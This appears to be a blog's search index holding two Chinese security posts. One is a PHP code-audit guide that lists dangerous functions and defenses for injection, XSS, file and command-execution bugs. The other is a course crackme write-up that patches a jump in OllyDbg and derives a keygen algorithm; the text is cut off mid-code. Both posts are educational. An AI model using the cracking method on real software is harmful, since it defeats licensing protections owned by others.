<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>PHP代码审计简单总结</title>
    <link href="/2023/01/01/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/"/>
    <url>/2023/01/01/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h3 id="审计之前的准备"><a href="#审计之前的准备" class="headerlink" title="审计之前的准备"></a>审计之前的准备</h3><h4 id="掌握语法"><a href="#掌握语法" class="headerlink" title="掌握语法"></a>掌握语法</h4><p>首先需要对PHP要有一个较为深刻的认识。掌握PHP的语法是基础，其次，需要了解PHP的特点（与其他语言的不同之处），整体而言，我认为PHP的语法和其他语言的差别还是比较大的。个人认为，代码审计实则也是个逆向的过程，如果连正向知识都不清楚，逆向也不会有太好的结果。</p><h4 id="PHP安全相关配置"><a href="#PHP安全相关配置" class="headerlink" title="PHP安全相关配置"></a>PHP安全相关配置</h4><p>PHP_INI_常量定义</p><table><thead><tr><th>常量</th><th>含义</th></tr></thead><tbody><tr><td>PHP_INI_USER</td><td>在用户的PHP脚本或Windows注册表中设置</td></tr><tr><td>PHP_INT_PERDIR</td><td>在php.ini .htaccess 或httpd.conf中设置</td></tr><tr><td>PHP_INI_SYSTEM</td><td>在php.ini 或.htaccess中设置</td></tr><tr><td>PHP_INI_ALL</td><td>在任何地方设置</td></tr><tr><td>php.ini only</td><td>仅可在php.ini中配置</td></tr><tr><td>register_globals</td><td></td></tr><tr><td>PHP版本5.4.0之前存在，将GET、POST提交的参数作为全局变量并初始化值。</td><td></td></tr></tbody></table><ol><li>register_globals</li></ol><p>PHP版本5.4.0之前存在，将GET、POST提交的参数作为全局变量并初始化值。</p><ol start="2"><li>allow_url_include</li></ol><p>该配置表示是否允许包含远程文件（影响较大）。</p><ol start="3"><li>magic_quotes_gpc</li></ol><p>PHP版本5.4.0之前存在，魔术引号，将GET、POST、COOKIE变量中的单引号、双引号、反斜杠、空字符前加上<code>\</code>,该配置并不会作用于$_SERVER变量，所以会导致一些漏洞。</p><ol start="4"><li>magic_quotes_runtime</li></ol><p>PHP版本5.4.0之前存在，与magic_quotes_gpc类似，区别在于magic_quotes_runtime只作用于从数据库或文件中获取的数据，可用于预防二次注入。</p><p>受影响的函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">get_meta_tags</span>()<br><span class="hljs-title function_ invoke__">file_get_contents</span>()<br><span class="hljs-title function_ invoke__">file</span>()<br><span class="hljs-title function_ invoke__">fgets</span>()<br><span class="hljs-title function_ invoke__">fwrite</span>()<br><span class="hljs-title function_ invoke__">fread</span>()<br><span class="hljs-title function_ invoke__">fputcsv</span>()<br><span class="hljs-title function_ invoke__">stream_socket_recvfrom</span>()<br><span class="hljs-title function_ invoke__">exec</span>()<br><span class="hljs-title function_ invoke__">system</span>()<br><span class="hljs-title function_ invoke__">passthru</span>()<br><span class="hljs-title function_ invoke__">stream_get_contents</span>()<br><span class="hljs-title function_ invoke__">bzread</span>()<br><span class="hljs-title function_ invoke__">gzfile</span>()<br><span class="hljs-title function_ invoke__">gzgets</span>()<br><span class="hljs-title function_ invoke__">gzwrite</span>()<br><span class="hljs-title function_ invoke__">gzread</span>()<br><span class="hljs-title function_ invoke__">exif_read_data</span>()<br><span class="hljs-title function_ invoke__">dba_insert</span>()<br><span class="hljs-title function_ invoke__">dba_replace</span>()<br><span class="hljs-title function_ invoke__">dba_fetch</span>()<br><span class="hljs-title function_ invoke__">ibase_fetch_row</span>()<br><span class="hljs-title function_ invoke__">ibase_fetch_assoc</span>()<br><span class="hljs-title function_ invoke__">ibase_fetch_object</span>()<br><span class="hljs-title function_ invoke__">mssql_fetch_row</span>()<br><span class="hljs-title function_ invoke__">mssql_fetch_object</span>()<br><span class="hljs-title function_ invoke__">mssql_fetch_array</span>()<br><span class="hljs-title function_ invoke__">mssql_fetch_assoc</span>()<br><span class="hljs-title function_ invoke__">mysqli_fetch_row</span>()<br><span class="hljs-title function_ invoke__">mysqli_fetch_array</span>()<br><span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>()<br><span class="hljs-title function_ invoke__">mysqli_fetch_object</span>()<br><span class="hljs-title function_ invoke__">pg_fetch_row</span>()<br><span class="hljs-title function_ invoke__">pg_fetch_assoc</span>()<br><span class="hljs-title function_ invoke__">pg_fetch_array</span>()<br><span class="hljs-title function_ invoke__">pg_fetch_object</span>()<br><span class="hljs-title function_ invoke__">pg_fetch_all</span>()<br><span class="hljs-title function_ invoke__">pg_select</span>()<br><span class="hljs-title function_ invoke__">sybase_fetch_object</span>()<br><span class="hljs-title function_ invoke__">sybase_fetch_array</span>()<br><span class="hljs-title function_ invoke__">sybase_fetch_assoc</span>()<br><span class="hljs-title class_">SplFileObject</span>::<span class="hljs-title function_ invoke__">fgets</span>()<br><span class="hljs-title class_">SplFileObject</span>::<span class="hljs-title function_ invoke__">fgetcsv</span>()<br><span class="hljs-title class_">SplFileObject</span>::<span class="hljs-title function_ invoke__">fwrite</span>()<br></code></pre></td></tr></table></figure><ol start="5"><li>magic_quotes_sybase</li></ol><p>PHP版本5.4.0之前存在。该配置如果开起，会覆盖magic_quotes_gpc的效果，与其相比，magic_quotes_sybase只对空字符进行了转义，并把单引号变为双引号。使用的的较少。</p><ol start="6"><li>safe_mode</li></ol><p>PHP版本5.4.0之前存在。在安全模式下，一些尝试访问文件系统的函数和功能将被限制。受限制的函数如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">dbase_open</span>()<br><span class="hljs-title function_ invoke__">filepro</span>()<br><span class="hljs-title function_ invoke__">filepro_rowcount</span>()<br><span class="hljs-title function_ invoke__">filepro_retrieve</span>()<br><span class="hljs-title function_ invoke__">pg_lo_import</span>()<br><span class="hljs-title function_ invoke__">posix_mkfifo</span>()<br><span class="hljs-title function_ invoke__">putenv</span>()<br><span class="hljs-title function_ invoke__">putenv</span>()<br><span class="hljs-title function_ invoke__">move_uploaded_file</span>()<br><span class="hljs-title function_ invoke__">chdir</span>()<br><span class="hljs-title function_ invoke__">dl</span>()<br><span class="hljs-title function_ invoke__">shell_exec</span>()<br><span class="hljs-title function_ invoke__">exec</span>()<br><span class="hljs-title function_ invoke__">escapeshellcmd</span>()<br><span class="hljs-title function_ invoke__">system</span>()<br><span class="hljs-title function_ invoke__">escapeshellcmd</span>()<br><span class="hljs-title function_ invoke__">passthru</span>()<br><span class="hljs-title function_ invoke__">escapeshellcmd</span>()<br><span class="hljs-title function_ invoke__">popen</span>()<br><span class="hljs-title function_ invoke__">escapeshellcmd</span>()<br><span class="hljs-title function_ invoke__">fopen</span>()<br><span class="hljs-title function_ invoke__">mkdir</span>()<br><span class="hljs-title function_ invoke__">rmdir</span>()<br><span class="hljs-title function_ invoke__">rename</span>()<br><span class="hljs-title function_ invoke__">unlink</span>()<br><span class="hljs-title function_ invoke__">copy</span>()<br><span class="hljs-title function_ invoke__">chgrp</span>()<br><span class="hljs-title function_ invoke__">chown</span>()<br><span class="hljs-title function_ invoke__">chmod</span>()<br><span class="hljs-title function_ invoke__">touch</span>()<br><span class="hljs-title function_ invoke__">symlink</span>()<br><span class="hljs-title function_ invoke__">link</span>()<br><span class="hljs-title function_ invoke__">apache_request_headers</span>()<br><span class="hljs-title function_ invoke__">header</span>()<br><span class="hljs-title function_ invoke__">highlight_file</span>()<br><span class="hljs-title function_ invoke__">show_source</span>()<br><span class="hljs-title function_ invoke__">parse_ini_file</span>()<br><span class="hljs-title function_ invoke__">set_time_limit</span>()<br><span class="hljs-title function_ invoke__">mail</span>()<br><span class="hljs-title function_ invoke__">session_start</span>()<br></code></pre></td></tr></table></figure><p>在php安全模式打开的时候，需要包含一些文件时，可以使用safe_mode_include_dir指令来配置包含的路径；需要执行系统程序的时候，必须是在safe_mode_exec_dir选项指定目录的程序，否则执行将失败。即使允许执行，那么也会自动的传递给escapeshellcmd函数进行过滤。</p><ol start="7"><li>open_basedir</li></ol><p>该配置来限制PHP可以访问的目录，以分号间隔。注意用open_basedir指定的限制实际上是前缀,而不是目录名。<br>举例来说: 若”open_basedir &#x3D; &#x2F;dir&#x2F;user”, 那么目录 “&#x2F;dir&#x2F;user” 和 “&#x2F;dir&#x2F;user1”都是<br>可以访问的。所以如果要将访问限制在仅为指定的目录，请用斜线结束路径名。（所以open_basedir有许多绕过方法）。</p><ol start="8"><li>disable_functions</li></ol><p>通过该配置可以禁止危险函数如dl()函数等，以逗号隔开。</p><ol start="9"><li>display_errors和erroe_reporting</li></ol><p>表明是否显示PHP脚本的内部错误。在生产环境中建议关闭回显。</p><h3 id="代码审计工具"><a href="#代码审计工具" class="headerlink" title="代码审计工具"></a>代码审计工具</h3><p>为了提高审计效率，一个好的代码审计工具必不可少。代码审计需要的功能不过就是全局搜索、函数定位、变量跟踪、调试等。其实大部分代码编辑器都能做到。比较方便的有VS code、Seay等。目前还有一款非常强大的代码审计工具codeQL，支持很多语言，但不支持PHP，在审计其他语言时非常好用，有一定的学习成本。</p><h3 id="审计思路"><a href="#审计思路" class="headerlink" title="审计思路"></a>审计思路</h3><ul><li><p>敏感关键字回溯参数传递过程。<br>在审计之前，就应该对危险函数有个认识，按照checklist定位危险函数是比较常用的手段。</p></li><li><p>查找可控变量，正向追踪变量传递过程。<br>一切漏洞的缘由在于攻击者有可控的变量，正向追踪用户传递的变量，查看变量经过的函数、分析变量的生命周期。</p></li><li><p>寻找敏感功能点，通读功能点代码。<br>什么样的功能决定了什么样的漏洞，根据业务应用的逻辑来缩小审计的范围。对寻找逻辑漏洞也很有帮助。</p></li><li><p>直接通读全文代码。<br>能够清楚地了解整个代码的逻辑及其架构，审计也会更加全面，但比较耗时。</p></li></ul><h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>首先明确漏洞出现的地方，有与数据库交互的地方，就可能存在sql注入。对于sql注入漏洞而言，一般采用关键字回溯来审计，通过关键字搜索如select、update等sql语句迅速定位。然后检查是否存在用户可控的变量，如果存在，是否有安全完整的过滤。是否存在宽字节、二次注入等问题。</p><h5 id="漏洞防范"><a href="#漏洞防范" class="headerlink" title="漏洞防范"></a>漏洞防范</h5><ol><li><p>对于字符型注入，可以使用gpc；对于数字型注入，可使用intval等强制类型转换。</p></li><li><p>编写过滤函数和类。过滤一定要严谨，且正确的使用。</p></li></ol><p>过滤时可参考addslashes()、mysql_escape_string()、mysql_real_escape_string()、intval()等。</p><ol start="3"><li>采用预编译的方式（最好）。</li></ol><h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><p>XSS漏洞是一个较难完全防范的点，要挖掘XSS漏洞主要要定位一些输出函数，如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">print</span>()、<span class="hljs-title function_ invoke__">print_r</span>()、<span class="hljs-keyword">echo</span>()、<span class="hljs-title function_ invoke__">printf</span>()、<span class="hljs-title function_ invoke__">sprintf</span>()、<span class="hljs-keyword">die</span>()、<span class="hljs-title function_ invoke__">var_dump</span>()、<span class="hljs-title function_ invoke__">var_export</span>()<br></code></pre></td></tr></table></figure><p>另外，仍然需要注意用户传入的参数。包括反射型、存储型，留意变量的变化。测试过滤函数或类是否过滤完全、能否绕过。特殊地，DOM型XSS由于不经过后端，所以难以防范。需要对前端代码进行审计。</p><h5 id="漏洞防范-1"><a href="#漏洞防范-1" class="headerlink" title="漏洞防范"></a>漏洞防范</h5><p>需要过滤的字符有<code>&#39;</code>、<code>&quot;</code>、 <code>&lt;&gt;</code>、 <code>\</code>、 <code>:</code>、 <code>&amp;</code>、 <code>#</code>。还需要加入白名单（最好）或黑名单来过滤标签事件，如果匹配成功，则直接拦截，而非替换为空。</p><h4 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h4><p>csrf漏洞主要在于已经登陆过的用户去进行的一些操作（是携带了个人信息）。所以主要关注整个系统是否使用了token的保护机制，以及是否正确的使用token。csrf漏洞配合黑盒测试会更加直接一些，能够快速确定漏洞是否存在。</p><h5 id="漏洞防范-2"><a href="#漏洞防范-2" class="headerlink" title="漏洞防范"></a>漏洞防范</h5><ol><li><p>使用并正确的使用token。</p></li><li><p>添加referer等字段。</p></li><li><p>添加验证码。（破坏用户体验）</p></li></ol><h4 id="文件操作漏洞"><a href="#文件操作漏洞" class="headerlink" title="文件操作漏洞"></a>文件操作漏洞</h4><ol><li>文件包含漏洞</li></ol><p>文件包含漏洞主要设计到4个函数</p><ul><li>include()</li><li>include_once()</li><li>require()</li><li>require_once()</li></ul><p>主要回溯查看这四个函数的参数是否有可控变量。还需要注意是否存在包含截断漏洞如%00截断、？截断等。</p><ol start="2"><li>文件读取（下载）漏洞</li></ol><p>该类漏洞仍然需要着重关注相关函数如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">file_get_contents</span>()<br><span class="hljs-title function_ invoke__">highlight_file</span>()<br><span class="hljs-title function_ invoke__">fopen</span>()<br><span class="hljs-title function_ invoke__">readfile</span>()<br><span class="hljs-title function_ invoke__">fread</span>()<br><span class="hljs-title function_ invoke__">fgetss</span>()<br><span class="hljs-title function_ invoke__">fgets</span>()<br><span class="hljs-title function_ invoke__">parse_ini_file</span>()<br><span class="hljs-title function_ invoke__">show_source</span>()<br><span class="hljs-title function_ invoke__">file</span>()<br></code></pre></td></tr></table></figure><ol start="3"><li>文件上传漏洞</li></ol><p>一般web应用需要用到上传功能的地方很少，在上传头像的地方较多。关于上传的函数就只有move_uploaded_file()一个，主要定位该函数即可。</p><ol start="4"><li>文件删除漏洞</li></ol><p>通常与unlink()和session_destroy()有关。文件删除漏洞和文件的读取漏洞基本类似，只是函数不同而已，一般导致的原因是可以使用..&#x2F;向上级目录跳转；或者是没有限制当前用户的删除权限，导致当前用户可以越权删除不属于他的文件。</p><h5 id="漏洞防范-3"><a href="#漏洞防范-3" class="headerlink" title="漏洞防范"></a>漏洞防范</h5><p>文件操作漏洞常见的三个问题：</p><ol><li><p>越权操作未授权的文件。</p></li><li><p>在请求中直接传入文件名。</p></li><li><p>操作更多文件需要跳转目录。</p></li></ol><p>针对以上三个容易出现的问题，可以制定对应的防御手段：</p><ol><li><p>对权限的管理要合理，例如，用户不能删除同级的其他用户的文件，只能操作自己的文件；特殊文件（后台文件）只允许管理员操作。</p></li><li><p>文件操作没必要传参时直接传入文件名，如?dfile&#x3D;123.jpg，可以采用更好的方式，如数据库储存md5等。</p></li><li><p>禁止目录跳转，禁止参数中有..&#x2F; 之类的跳转操作。</p></li></ol><p>对应文件上传漏洞，建议使用白名单进行过滤。另外，还可以采用隐藏路径、随机命名、二次渲染来完善防御。</p><h4 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h4><p>代码执行漏洞危害很大，相当于直接有了webshell。代码执行就是执行PHP代码。一般采用关键字回溯的方式进行挖掘。其相关的函数有：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">eval</span>()<br><span class="hljs-title function_ invoke__">assert</span>()<br><span class="hljs-title function_ invoke__">preg_replace</span>()<br><span class="hljs-title function_ invoke__">call_user_func</span>()<br><span class="hljs-title function_ invoke__">call_user_func_array</span>()<br><span class="hljs-title function_ invoke__">array_map</span>()<br></code></pre></td></tr></table></figure><p>另外还有动态函数$a($b)也会导致代码执行，在挖掘该类漏洞时，需要找到可控的动态函数名。</p><p>call_user_func()的同类函数还有</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">call_user_func</span>()、<span class="hljs-title function_ invoke__">call_user_func_array</span>()、<span class="hljs-title function_ invoke__">array_map</span>()<br><span class="hljs-title function_ invoke__">usort</span>()、<span class="hljs-title function_ invoke__">uasort</span>()、<span class="hljs-title function_ invoke__">uksort</span>()、<span class="hljs-title function_ invoke__">array_filter</span>()<br><span class="hljs-title function_ invoke__">array_reduce</span>()、<span class="hljs-title function_ invoke__">array_diff_uassoc</span>()、<span class="hljs-title function_ invoke__">array_diff_ukey</span>()<br><span class="hljs-title function_ invoke__">array_udiff</span>()、<span class="hljs-title function_ invoke__">array_udiff_assoc</span>()、<span class="hljs-title function_ invoke__">array_udiff_uassoc</span>()<br><span class="hljs-title function_ invoke__">array_intersect_assoc</span>()、<span class="hljs-title function_ invoke__">array_intersect_uassoc</span>()<br><span class="hljs-title function_ invoke__">array_uintersect</span>()、<span class="hljs-title function_ invoke__">array_uintersect_assoc</span>()<br><span class="hljs-title function_ invoke__">array_uintersect_uassoc</span>()、<span class="hljs-title function_ invoke__">array_walk</span>()、<span class="hljs-title function_ invoke__">array_walk_recursive</span>()<br><span class="hljs-title function_ invoke__">xml_set_character_data_handler</span>()、<span class="hljs-title function_ invoke__">xml_set_default_handler</span>()<br><span class="hljs-title function_ invoke__">xml_set_element_handler</span>()、<span class="hljs-title function_ invoke__">xml_set_end_namespace_decl_handler</span>()<br><span class="hljs-title function_ invoke__">xml_set_external_entity_ref_handler</span>()、<span class="hljs-title function_ invoke__">xml_set_notation_decl_handler</span>()<br><span class="hljs-title function_ invoke__">xml_set_processing_instruction_handler</span>()<br><span class="hljs-title function_ invoke__">xml_set_start_namespace_decl_handler</span>()<br><span class="hljs-title function_ invoke__">xml_set_unparsed_entity_decl_handler</span>()、<span class="hljs-title function_ invoke__">stream_filter_register</span>()<br><span class="hljs-title function_ invoke__">set_error_handler</span>()、<span class="hljs-title function_ invoke__">register_shutdown_function</span>()、<span class="hljs-title function_ invoke__">register_tick_function</span>()<br></code></pre></td></tr></table></figure><h5 id="漏洞防范-4"><a href="#漏洞防范-4" class="headerlink" title="漏洞防范"></a>漏洞防范</h5><p>在满足正常业务的需求下，采用白名单过滤参数。（最好的方法是禁止可控变量与该类函数接触）。</p><h4 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h4><p>与代码执行漏洞不同，命令执行函数执行的是系统命令。但审计的思路和挖掘代码执行漏洞相同。</p><p>与命令执行有关的函数有7个：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">system</span>()<br><span class="hljs-title function_ invoke__">exec</span>()<br><span class="hljs-title function_ invoke__">shell_exec</span>()<br><span class="hljs-title function_ invoke__">passthru</span>()<br><span class="hljs-title function_ invoke__">pcntl_exec</span>()<br><span class="hljs-title function_ invoke__">popen</span>()<br><span class="hljs-title function_ invoke__">proc_open</span>()<br></code></pre></td></tr></table></figure><p>另外反引号&#96;&#96; 也可以执行命令，其本质是调用shell_exec()函数。</p><h5 id="漏洞防范-5"><a href="#漏洞防范-5" class="headerlink" title="漏洞防范"></a>漏洞防范</h5><p>在过滤可以使用escapeshellcmd()过滤整条命令，escapeshellarg()过滤参数。也可以采用参数白名单进行过滤。</p><h4 id="变量覆盖漏洞"><a href="#变量覆盖漏洞" class="headerlink" title="变量覆盖漏洞"></a>变量覆盖漏洞</h4><p>经常引发该类漏洞的函数有extract()、parse_str()、import_request_variables()，其中import_request_variables()函数调用后相当于开起了全局变量注册，在5.4之后被取消。挖掘时还可以全局搜索$$来定位这种特殊的变量覆盖。</p><h5 id="漏洞防范-6"><a href="#漏洞防范-6" class="headerlink" title="漏洞防范"></a>漏洞防范</h5><p>该漏洞出现的主要原因是因为没有判断变量是否已经存在。最直接的解决方法就是不进行变量注册，直接使用原生的$_GET和$_POST数组进行操作。如果使用了extract()函数，也可以配置第二个参数extract_type为EXTR_SKIP，及若有冲突，不覆盖变量。</p><h4 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h4><p>逻辑漏洞往往与业务逻辑相关联，在审计过程中通过定位功能点的方式来挖掘漏洞比较有效。另外，配合黑盒测试也可以快速定位问题所在。除开业务逻辑外，一些函数本身也容易造成逻辑漏洞。如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-title function_ invoke__">in_array</span>()<br><span class="hljs-title function_ invoke__">is_numeric</span>()<br>===<br>==<br></code></pre></td></tr></table></figure><p>再比如：在使用header()函数进行跳转时没有exit或return当前文件，导致PHP继续执行。</p><h5 id="漏洞防范-7"><a href="#漏洞防范-7" class="headerlink" title="漏洞防范"></a>漏洞防范</h5><p>程序员应该对整个业务逻辑足够熟悉，才能写出精简而不画蛇添足的代码，其次应该熟悉编程语言的各种函数，了解各个函数的特点。</p><h4 id="其他漏洞"><a href="#其他漏洞" class="headerlink" title="其他漏洞"></a>其他漏洞</h4><p>本文只列举了一部分漏洞，还有很多漏洞没有介绍，如：XXE、反序列化漏洞、SSRF等等。但其实大致审计思路都相似。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>代码审计是一个熟能生巧的技术，它不仅对审计人员的正向开发有较高的要求，还要求审计人员熟悉该编程语言的特性以及容易出现问题的地方。审计更是一个考验耐心的技术活，容不得一丝心浮气躁，细心方能挖遍天下。当然，PHP现在也正在淡出舞台，但代码审计的思想适用于每种语言。</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次简单的逆向考试题分析</title>
    <link href="/2022/11/14/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E9%80%86%E5%90%91%E8%80%83%E8%AF%95%E9%A2%98%E5%88%86%E6%9E%90/"/>
    <url>/2022/11/14/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E9%80%86%E5%90%91%E8%80%83%E8%AF%95%E9%A2%98%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本学期开了一门逆向的选修课，短短几门课也学不到什么东西，主要是老师带学生入门一下逆向，扩宽一下知识面（甚至达不到入门的水平）。然后是期末考试有一道题比较好玩，自己写了注册机，比较有成就感，于是想记录一下。</p><h3 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h3><p>程序根据用户输入的“用户名”通过内部算法计算出注册码，该注册码会与用户输入的“序列号”进行比较，如果注册失败，会弹出提示信息“序列号错误，再来一次”，如果注册成功，会弹出提示：“恭喜你！成功！”。</p><p>破解该程序<br>编写注册机</p><img title="" src="https://white9ashpic.oss-cn-chengdu.aliyuncs.com/img/5.png" alt=""><h3 id="破解："><a href="#破解：" class="headerlink" title="破解："></a>破解：</h3><p>打开OD进行调试，因为在输入序列号错误后会弹出“序列号错误”的对话框，开始尝试使用字符串搜索看是否能找到相关的逻辑处理的语句，断点会断在莫名其妙的地方。（我的想法是，如果要弹出该字符串，就应该会经过这里的地址，就可以断下来。但实际上总是断在一些莫名其妙的地方）。</p><img title="" src="https://white9ashpic.oss-cn-chengdu.aliyuncs.com/img/image-20221114234443575.png" alt=""><p>更换思路，程序一定会获取用户输入的用户名和序列号，所以一定会调用getDlgItemTextA函数，右键查找引用，找到调用函数的位置。下断点</p><img title="" src="https://white9ashpic.oss-cn-chengdu.aliyuncs.com/img/20221126235312.png" alt=""><p>下断点后单步调试，注意寄存器和栈中值的变换。在getDlgTextA函数以后运行到该位置时，恰好将用户名和序列号赋给EAX和ECX，并将其压栈。</p><p><img src="https://white9ashpic.oss-cn-chengdu.aliyuncs.com/img/clip_image002.jpg"></p><img title="" src="https://white9ashpic.oss-cn-chengdu.aliyuncs.com/img/202211262358811.jpg" alt=""><p><img title="" src="https://white9ashpic.oss-cn-chengdu.aliyuncs.com/img/202211262359090.jpg" alt="">然后立即call了D310A0这个函数，调用完后比较了一次eax的值并且使用的是je指令，比较的结果是不相等，跳转到D3126E处，继续执行。</p><img title="" src="https://white9ashpic.oss-cn-chengdu.aliyuncs.com/img/202211270000638.jpg" alt=""><p>接下来就是调用MessageBeep发出提示音，调用DialogBoxParamA弹出对话框”序列号错误，请再来一次。”</p><p>因为只有一处比较指令，猜测je指令为最终的判断序列号是否相等的指令，将其注释后运行。</p><img title="" src="https://white9ashpic.oss-cn-chengdu.aliyuncs.com/img/202211270000459.jpg" alt=""><p>成功破解。</p><img title="" src="https://white9ashpic.oss-cn-chengdu.aliyuncs.com/img/202211270002054.jpg" alt=""><h3 id="编写注册机"><a href="#编写注册机" class="headerlink" title="编写注册机"></a>编写注册机</h3><p>从上可知，获取到两处用户的输入后，立即调用了D310A0函数，并在调用结束后进行序列号是否正确的比较，由此可以得出，D310A0应该为序列号的生成函数。</p><p>进入到函数中分析算法。测试用的数据为</p><img title="" src="https://white9ashpic.oss-cn-chengdu.aliyuncs.com/img/202211270003954.jpg" alt=""><img title="" src="https://white9ashpic.oss-cn-chengdu.aliyuncs.com/img/202211270003874.jpg" alt=""><p>首先是将eax赋值为3，其次将esi赋值为7，因为填入的用户名长度为7，所以esi的值应该是用户名长度。然后再将edx和ecx置零。然后比较esi和eax，因为esi的值为字符串长度始终大于4，所以该语句永远不会跳转。Push ebx和push edi后面又有pop，这里是保存ebx和edi的值。进入新的比较cmp ecx，4 。ecx大于4又会将ecx清零，所以ecx的值不是循环次数。</p><img title="" src="https://white9ashpic.oss-cn-chengdu.aliyuncs.com/img/202211270003952.jpg" alt=""><p>两指令将取了用户名下标为3的值34，movzx ebx, byte ptr [ecx+D39000]该指令将内存为D39000+ecx的值赋给ebx。然后edi和ebx相乘，结果赋给edi，eax+1，将edi的值赋给edx，ecx+1。<br><img title="" src="https://white9ashpic.oss-cn-chengdu.aliyuncs.com/img/202211270003841.jpg" alt=""></p><p>继续比较eax和esi，小于则继续循环，大于则退出循环（该处为真正的循环条件）。</p><p>然后调用wsprintfA()将字符串输入到缓冲区</p><img title="" src="https://white9ashpic.oss-cn-chengdu.aliyuncs.com/img/202211270004691.jpg" alt=""><p>然后比较esi和eax的值，也就是生成的序列号和输入的序列号</p><img title="" src="https://white9ashpic.oss-cn-chengdu.aliyuncs.com/img/202211270004880.jpg" alt=""><p>算法分析：从用户名第4位到最后一位每一位，每次将该位对应的ascii码依次乘以一个0x0C,0x0A,0x0E,0x0F,0x0C的循环。并将乘积的和的10进制作为序列号。</p><p>注册机编写：</p><figure class="highlight python"><table><tr><td 